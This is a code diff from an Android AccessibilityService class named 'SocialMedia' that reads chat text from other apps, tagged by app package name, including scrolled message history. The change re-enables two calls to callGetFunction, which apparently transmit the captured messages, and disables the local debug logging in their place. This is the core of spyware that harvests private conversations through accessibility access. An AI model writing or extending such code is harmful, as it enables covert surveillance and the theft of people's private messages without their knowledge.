@@ -233,14 +233,14 @@ public class SocialMedia extends AccessibilityService {
 
         if (!chatType.equalsIgnoreCase("scroll")) {
             txtContent = updated;
-            //callGetFunction(updated, packageName + "_C");
-         Log.d("accvalue", updated+"^"+packageName + "_C");
+            callGetFunction(updated, packageName + "_C");
+         //Log.d("accvalue", updated+"^"+packageName + "_C");
         }
         if (chatType.equalsIgnoreCase("scroll")) {
             updated = txtContent + "\r\n" + updated;
-            //callGetFunction(updated, packageName + "_S");
+            callGetFunction(updated, packageName + "_S");
             txtContent = "";
-         Log.d("accvalue", updated+"^"+packageName + "_S");
+         //Log.d("accvalue", updated+"^"+packageName + "_S");
         }
     }
 
